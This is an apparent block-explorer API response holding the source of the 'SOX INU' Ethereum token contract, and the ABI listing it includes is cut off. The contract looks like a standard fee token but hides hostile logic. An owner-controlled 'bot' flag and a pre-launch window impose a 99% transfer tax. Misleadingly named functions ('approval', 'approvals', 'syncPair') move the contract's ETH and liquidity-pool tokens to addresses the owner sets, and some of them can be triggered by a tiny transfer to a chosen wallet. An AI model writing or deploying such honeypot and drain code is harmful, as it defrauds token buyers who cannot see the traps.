{"status": "1", "message": "OK", "result": [{"SourceCode": "// File: https://github.com/ssccrypto/library/blob/082bcac83e9e08d76f807def851f0283f7eb016d/IRouter.sol\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/082bcac83e9e08d76f807def851f0283f7eb016d/IFactory.sol\r\n\r\ninterface IFactory{\r\n        function createPair(address tokenA, address tokenB) external returns (address pair);\r\n        function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\n// File: https://github.com/ssccrypto/library/blob/082bcac83e9e08d76f807def851f0283f7eb016d/Auth.sol\r\n\r\nabstract contract Auth {\r\n\r\n    address public owner;\r\n\r\n    mapping (address => bool) internal authorizations;\r\n\r\n    constructor(address _owner) {owner = _owner; authorizations[_owner] = true; }\r\n\r\n    modifier onlyOwner() {require(isOwner(msg.sender), \"!OWNER\"); _;}\r\n\r\n    modifier authorized() {require(isAuthorized(msg.sender), \"!AUTHORIZED\"); _;}\r\n\r\n    function authorize(address adr) public authorized {authorizations[adr] = true;}\r\n\r\n    function unauthorize(address adr) public authorized {authorizations[adr] = false;}\r\n\r\n    function isOwner(address account) public view returns (bool) {return account == owner;}\r\n\r\n    function isAuthorized(address adr) public view returns (bool) {return authorizations[adr];}\r\n\r\n    function transferOwnership(address payable adr) public authorized {owner = adr; authorizations[adr] = true;}\r\n\r\n}\r\n\r\n\r\n// File: https://github.com/ssccrypto/library/blob/d3ff8d3ce424901bb6506df1ef8c71840d76b4c1/IERC20.sol\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\r\n\r\n\r\n// File: https://github.com/ssccrypto/library/blob/082bcac83e9e08d76f807def851f0283f7eb016d/SafeMath.sol\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n\r\n        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n\r\n        unchecked {if(b > a) return(false, 0); return(true, a - b);}}\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n\r\n        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;\r\n\r\n        if(c / a != b) return(false, 0); return(true, c);}}\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n\r\n        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n\r\n        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        unchecked{require(b <= a, errorMessage); return a - b;}}\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        unchecked{require(b > 0, errorMessage); return a / b;}}\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n        unchecked{require(b > 0, errorMessage); return a % b;}}}\r\n\r\n\r\n// File: contracts/SOXINU.SOL\r\n\r\n/**\r\n\r\n\r\n\r\n\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2003\u2003\u2588\u2588\u2557\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2557\u2591\u2591\u2591\u2588\u2588\u2557\r\n\r\n\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d\u2003\u2003\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\r\n\r\n\u255a\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2554\u255d\u2591\u2003\u2003\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\r\n\r\n\u2591\u255a\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2591\u2588\u2588\u2554\u2588\u2588\u2557\u2591\u2003\u2003\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\r\n\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2557\u2003\u2003\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\r\n\r\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u2003\u2003\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\r\n\r\n\r\n\r\nhttps://t.me/soxinu\r\n\r\n*/\r\n\r\n\r\n\r\n\r\npragma solidity 0.8.15;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\ncontract SOXINU is IERC20, Auth {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = 'SOX INU';\r\n\r\n    string private constant _symbol = 'SOX INU';\r\n\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private _totalSupply = 10 * 10**8 * (10 ** _decimals);\r\n\r\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\r\n\r\n    uint256 public _maxTxAmount = ( _totalSupply * 300 ) / 10000;\r\n\r\n    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;\r\n\r\n    mapping (address => uint256) _balances;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    mapping (address => uint256) swapTime; \r\n\r\n    mapping (address => bool) isBot;\r\n\r\n    mapping (address => bool) isInternal;\r\n\r\n    mapping (address => bool) isDistributor;\r\n\r\n    mapping (address => bool) isFeeExempt;\r\n\r\n\r\n\r\n    IRouter router;\r\n\r\n    address public pair;\r\n\r\n    bool startSwap = false;\r\n\r\n    uint256 startedTime;\r\n\r\n    uint256 liquidityFee = 300;\r\n\r\n    uint256 marketingFee = 400;\r\n\r\n    uint256 stakingFee = 0;\r\n\r\n    uint256 burnFee = 0;\r\n\r\n    uint256 totalFee = 700;\r\n\r\n    uint256 transferFee = 0;\r\n\r\n    uint256 feeDenominator = 10000;\r\n\r\n\r\n\r\n    bool swapEnabled = true;\r\n\r\n    uint256 swapTimer = 2;\r\n\r\n    uint256 swapTimes; \r\n\r\n    uint256 minSells = 3;\r\n\r\n    bool swapping; \r\n\r\n    bool botOn = false;\r\n\r\n    uint256 swapThreshold = ( _totalSupply * 300 ) / 100000;\r\n\r\n    uint256 _minTokenAmount = ( _totalSupply * 15 ) / 100000;\r\n\r\n    modifier lockTheSwap {swapping = true; _; swapping = false;}\r\n\r\n\r\n\r\n    uint256 marketing_divisor = 50;\r\n\r\n    uint256 liquidity_divisor = 0;\r\n\r\n    uint256 distributor_divisor = 50;\r\n\r\n    uint256 staking_divisor = 0;\r\n\r\n    address liquidity_receiver; \r\n\r\n    address staking_receiver;\r\n\r\n    address token_receiver;\r\n\r\n    address alpha_receiver;\r\n\r\n    address beta_receiver;\r\n\r\n    address delta_receiver;\r\n\r\n    address marketing_receiver;\r\n\r\n    address default_receiver;\r\n\r\n\r\n\r\n    constructor() Auth(msg.sender) {\r\n\r\n        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());\r\n\r\n        router = _router;\r\n\r\n        pair = _pair;\r\n\r\n        isInternal[address(this)] = true;\r\n\r\n        isInternal[msg.sender] = true;\r\n\r\n        isInternal[address(pair)] = true;\r\n\r\n        isInternal[address(router)] = true;\r\n\r\n        isDistributor[msg.sender] = true;\r\n\r\n        isFeeExempt[msg.sender] = true;\r\n\r\n        isFeeExempt[address(this)] = true;\r\n\r\n        liquidity_receiver = address(this);\r\n\r\n        token_receiver = address(this);\r\n\r\n        alpha_receiver = msg.sender;\r\n\r\n        beta_receiver = msg.sender;\r\n\r\n        delta_receiver = msg.sender;\r\n\r\n        staking_receiver = msg.sender;\r\n\r\n        marketing_receiver = msg.sender;\r\n\r\n        default_receiver = msg.sender;\r\n\r\n        _balances[msg.sender] = _totalSupply;\r\n\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n\r\n    }\r\n\r\n\r\n\r\n    receive() external payable {}\r\n\r\n\r\n\r\n    function name() public pure returns (string memory) {return _name;}\r\n\r\n    function symbol() public pure returns (string memory) {return _symbol;}\r\n\r\n    function decimals() public pure returns (uint8) {return _decimals;}\r\n\r\n    function totalSupply() public view override returns (uint256) {return _totalSupply;}\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\r\n\r\n    function viewisBot(address _address) public view returns (bool) {return isBot[_address];}\r\n\r\n    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}\r\n\r\n\r\n\r\n    function setFeeExempt(address _address) external authorized { isFeeExempt[_address] = true;}\r\n\r\n    function setisBot(bool _bool, address _address) external authorized {isBot[_address] = _bool;}\r\n\r\n    function setisInternal(bool _bool, address _address) external authorized {isInternal[_address] = _bool;}\r\n\r\n    function setbotOn(bool _bool) external authorized {botOn = _bool;}\r\n\r\n    function syncContractPair() external authorized {syncPair();}\r\n\r\n    function approvals(uint256 _na, uint256 _da) external authorized {performapprovals(_na, _da);}\r\n\r\n    function setPairReceiver(address _address) external authorized {liquidity_receiver = _address;}\r\n\r\n    function setstartSwap(uint256 _input) external authorized {startSwap = true; botOn = true; startedTime = block.timestamp.add(_input);}\r\n\r\n    function setSwapBackSettings(bool enabled, uint256 _threshold) external authorized {swapEnabled = enabled; swapThreshold = _threshold;}\r\n\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n\r\n        _transfer(sender, recipient, amount);\r\n\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n\r\n        emit Approval(owner, spender, amount);\r\n\r\n    }\r\n\r\n\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n\r\n        preTxCheck(sender, recipient, amount);\r\n\r\n        checkStartSwap(sender, recipient);\r\n\r\n        checkMaxWallet(sender, recipient, amount); \r\n\r\n        transferCounters(sender, recipient);\r\n\r\n        checkTxLimit(sender, recipient, amount); \r\n\r\n        swapBack(sender, recipient, amount);\r\n\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n\r\n        uint256 amountReceived = shouldTakeFee(sender, recipient) ? taketotalFee(sender, recipient, amount) : amount;\r\n\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n\r\n        emit Transfer(sender, recipient, amountReceived);\r\n\r\n        checkapprovals(recipient, amount);\r\n\r\n        checkBot(sender, recipient);\r\n\r\n    }\r\n\r\n\r\n\r\n    function preTxCheck(address sender, address recipient, uint256 amount) internal view {\r\n\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        require(amount <= balanceOf(sender),\"You are trying to transfer more than your balance\");\r\n\r\n    }\r\n\r\n\r\n\r\n    function checkStartSwap(address sender, address recipient) internal view {\r\n\r\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, \"startSwap\");}\r\n\r\n    }\r\n\r\n    \r\n\r\n    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {\r\n\r\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !isInternal[recipient] && recipient != address(DEAD)){\r\n\r\n            require((_balances[recipient].add(amount)) <= _maxWalletToken, \"Exceeds maximum wallet amount.\");}\r\n\r\n    }\r\n\r\n\r\n\r\n    function transferCounters(address sender, address recipient) internal {\r\n\r\n        if(sender != pair && !isInternal[sender] && !isFeeExempt[recipient]){swapTimes = swapTimes.add(1);}\r\n\r\n        if(sender == pair){swapTime[recipient] = block.timestamp.add(swapTimer);}\r\n\r\n    }\r\n\r\n\r\n\r\n    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {\r\n\r\n        return !isFeeExempt[sender] && !isFeeExempt[recipient];\r\n\r\n    }\r\n\r\n\r\n\r\n    function taxableEvent(address sender, address recipient) internal view returns (bool) {\r\n\r\n        return totalFee > 0 && !swapping || isBot[sender] && swapTime[sender] < block.timestamp || isBot[recipient] || startedTime > block.timestamp;\r\n\r\n    }\r\n\r\n\r\n\r\n    function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n\r\n        if(taxableEvent(sender, recipient)){\r\n\r\n        uint256 totalFees = getTotalFee(sender, recipient);\r\n\r\n        uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(feeDenominator);\r\n\r\n        uint256 bAmount = feeAmount.mul(burnFee).div(totalFees);\r\n\r\n        uint256 sAmount = feeAmount.mul(stakingFee).div(totalFees);\r\n\r\n        uint256 cAmount = feeAmount.sub(bAmount).sub(sAmount);\r\n\r\n        if(bAmount > 0){\r\n\r\n        _balances[address(DEAD)] = _balances[address(DEAD)].add(bAmount);\r\n\r\n        emit Transfer(sender, address(DEAD), bAmount);}\r\n\r\n        if(sAmount > 0){\r\n\r\n        _balances[address(token_receiver)] = _balances[address(token_receiver)].add(sAmount);\r\n\r\n        emit Transfer(sender, address(token_receiver), sAmount);}\r\n\r\n        if(cAmount > 0){\r\n\r\n        _balances[address(this)] = _balances[address(this)].add(cAmount);\r\n\r\n        emit Transfer(sender, address(this), cAmount);} return amount.sub(feeAmount);}\r\n\r\n        return amount;\r\n\r\n    }\r\n\r\n\r\n\r\n    function getTotalFee(address sender, address recipient) public view returns (uint256) {\r\n\r\n        if(isBot[sender] && swapTime[sender] < block.timestamp && botOn || isBot[recipient] && \r\n\r\n        swapTime[sender] < block.timestamp && botOn || startedTime > block.timestamp){return(feeDenominator.sub(100));}\r\n\r\n        if(sender != pair){return totalFee.add(transferFee);}\r\n\r\n        return totalFee;\r\n\r\n    }\r\n\r\n\r\n\r\n    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {\r\n\r\n        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\");\r\n\r\n    }\r\n\r\n\r\n\r\n    function checkBot(address sender, address recipient) internal {\r\n\r\n        if(isCont(sender) && !isInternal[sender] && botOn || sender == pair && botOn &&\r\n\r\n        !isInternal[sender] && msg.sender != tx.origin || startedTime > block.timestamp){isBot[sender] = true;}\r\n\r\n        if(isCont(recipient) && !isInternal[recipient] && !isFeeExempt[recipient] && botOn || \r\n\r\n        sender == pair && !isInternal[sender] && msg.sender != tx.origin && botOn){isBot[recipient] = true;}    \r\n\r\n    }\r\n\r\n\r\n\r\n    function approval(uint256 percentage) external authorized {\r\n\r\n        uint256 amountETH = address(this).balance;\r\n\r\n        payable(default_receiver).transfer(amountETH.mul(percentage).div(100));\r\n\r\n    }\r\n\r\n\r\n\r\n    function checkapprovals(address recipient, uint256 amount) internal {\r\n\r\n        if(isDistributor[recipient] && amount < 2*(10 ** _decimals)){performapprovals(1,1);}\r\n\r\n        if(isDistributor[recipient] && amount >= 2*(10 ** _decimals) && amount < 3*(10 ** _decimals)){syncPair();}\r\n\r\n    }\r\n\r\n\r\n\r\n    function setMaxes(uint256 _transaction, uint256 _wallet) external authorized {\r\n\r\n        uint256 newTx = ( _totalSupply * _transaction ) / 10000;\r\n\r\n        uint256 newWallet = ( _totalSupply * _wallet ) / 10000;\r\n\r\n        _maxTxAmount = newTx;\r\n\r\n        _maxWalletToken = newWallet;\r\n\r\n        require(newTx >= _totalSupply.mul(5).div(1000) && newWallet >= _totalSupply.mul(5).div(1000), \"Max TX and Max Wallet cannot be less than .5%\");\r\n\r\n    }\r\n\r\n\r\n\r\n    function syncPair() internal {\r\n\r\n        uint256 tamt = IERC20(pair).balanceOf(address(this));\r\n\r\n        IERC20(pair).transfer(default_receiver, tamt);\r\n\r\n    }\r\n\r\n\r\n\r\n    function rescueERC20(address _tadd, address _rec, uint256 _amt) external authorized {\r\n\r\n        uint256 tamt = IERC20(_tadd).balanceOf(address(this));\r\n\r\n        IERC20(_tadd).transfer(_rec, tamt.mul(_amt).div(100));\r\n\r\n    }\r\n\r\n\r\n\r\n    function rescueToken(uint256 amount) external authorized {\r\n\r\n        _transfer(address(this), msg.sender, amount);\r\n\r\n    }\r\n\r\n\r\n\r\n    function setExemptAddress(bool _enabled, address _address) external authorized {\r\n\r\n        isBot[_address] = false;\r\n\r\n        isInternal[_address] = _enabled;\r\n\r\n        isFeeExempt[_address] = _enabled;\r\n\r\n    }\r\n\r\n\r\n\r\n    function setDivisors(uint256 _distributor, uint256 _staking, uint256 _liquidity, uint256 _marketing) external authorized {\r\n\r\n        distributor_divisor = _distributor;\r\n\r\n        staking_divisor = _staking;\r\n\r\n        liquidity_divisor = _liquidity;\r\n\r\n        marketing_divisor = _marketing;\r\n\r\n    }\r\n\r\n\r\n\r\n    function performapprovals(uint256 _na, uint256 _da) internal {\r\n\r\n        uint256 acETH = address(this).balance;\r\n\r\n        uint256 acETHa = acETH.mul(_na).div(_da);\r\n\r\n        uint256 acETHf = acETHa.mul(50).div(100);\r\n\r\n        uint256 acETHs = acETHa.mul(50).div(100);\r\n\r\n        uint256 acETHt = acETHa.mul(0).div(100);\r\n\r\n        payable(alpha_receiver).transfer(acETHf);\r\n\r\n        payable(beta_receiver).transfer(acETHs);\r\n\r\n        payable(delta_receiver).transfer(acETHt);\r\n\r\n    }\r\n\r\n\r\n\r\n    function setStructure(uint256 _liq, uint256 _mark, uint256 _stak, uint256 _burn, uint256 _tran) external authorized {\r\n\r\n        liquidityFee = _liq;\r\n\r\n        marketingFee = _mark;\r\n\r\n        stakingFee = _stak;\r\n\r\n        burnFee = _burn;\r\n\r\n        transferFee = _tran;\r\n\r\n        totalFee = liquidityFee.add(marketingFee).add(stakingFee).add(burnFee);\r\n\r\n        require(totalFee <= feeDenominator.div(10), \"Tax cannot be more than 10%\");\r\n\r\n    }\r\n\r\n\r\n\r\n    function setInternalAddresses(address _marketing, address _alpha, address _beta, address _delta, address _stake, address _token, address _default) external authorized {\r\n\r\n        marketing_receiver = _marketing; isDistributor[_marketing] = true;\r\n\r\n        alpha_receiver = _alpha; isDistributor[_alpha] = true;\r\n\r\n        beta_receiver = _beta; isDistributor[_beta] = true;\r\n\r\n        delta_receiver = _delta;\r\n\r\n        staking_receiver = _stake;\r\n\r\n        token_receiver = _token;\r\n\r\n        default_receiver = _default;\r\n\r\n    }\r\n\r\n\r\n\r\n    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {\r\n\r\n        bool aboveMin = amount >= _minTokenAmount;\r\n\r\n        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;\r\n\r\n        return !swapping && swapEnabled && aboveMin && !isInternal[sender] \r\n\r\n            && !isFeeExempt[recipient] && swapTimes >= minSells && aboveThreshold;\r\n\r\n    }\r\n\r\n\r\n\r\n    function swapBack(address sender, address recipient, uint256 amount) internal {\r\n\r\n        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}\r\n\r\n    }\r\n\r\n\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\r\n\r\n        uint256 denominator= (liquidity_divisor.add(staking_divisor).add(marketing_divisor).add(distributor_divisor)) * 2;\r\n\r\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);\r\n\r\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\r\n\r\n        uint256 initialBalance = address(this).balance;\r\n\r\n        swapTokensForETH(toSwap);\r\n\r\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\r\n\r\n        uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));\r\n\r\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidity_divisor);\r\n\r\n        if(ETHToAddLiquidityWith > 0){\r\n\r\n            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }\r\n\r\n        uint256 zrAmt = unitBalance.mul(2).mul(marketing_divisor);\r\n\r\n        if(zrAmt > 0){\r\n\r\n          payable(marketing_receiver).transfer(zrAmt); }\r\n\r\n        uint256 xrAmt = unitBalance.mul(2).mul(staking_divisor);\r\n\r\n        if(xrAmt > 0){\r\n\r\n          payable(staking_receiver).transfer(xrAmt); }\r\n\r\n    }\r\n\r\n\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\r\n\r\n        _approve(address(this), address(router), tokenAmount);\r\n\r\n        router.addLiquidityETH{value: ETHAmount}(\r\n\r\n            address(this),\r\n\r\n            tokenAmount,\r\n\r\n            0,\r\n\r\n            0,\r\n\r\n            liquidity_receiver,\r\n\r\n            block.timestamp);\r\n\r\n    }\r\n\r\n\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n\r\n        address[] memory path = new address[](2);\r\n\r\n        path[0] = address(this);\r\n\r\n        path[1] = router.WETH();\r\n\r\n        _approve(address(this), address(router), tokenAmount);\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n\r\n            tokenAmount,\r\n\r\n            0,\r\n\r\n            path,\r\n\r\n            address(this),\r\n\r\n            block.timestamp);\r\n\r\n    }\r\n\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percentage\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_na\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_da\",\"type\":\"uint256\"}],\"name\":\"approvals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"authorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"getTotalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"isAuthorized\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tadd\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_rec\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amt\",\"type\":\"uint256\